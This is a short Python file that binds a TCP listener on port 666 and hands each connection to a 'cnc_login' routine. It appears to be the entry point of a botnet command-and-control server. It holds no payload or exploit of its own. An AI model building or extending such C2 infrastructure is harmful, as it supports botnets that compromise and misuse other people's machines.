import socket, threading, sys, time
from files.logging.log import *
from files.networking.login import cnc_login

def client():
    pass

def binder():
    """if len(sys.argv) != 2:
        fatial("bind", "Missing args! [port]")
    port = int(sys.argv[1])"""
    port=666
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        sock.bind(('0.0.0.0', port))
        log("bind", "Binded to port!")
    except:
        fatial("bind", "Failed to bind the port!")
        sys.exit()

    sock.listen()
    while 1:
        threading.Thread(target=cnc_login, args=[*sock.accept()]).start()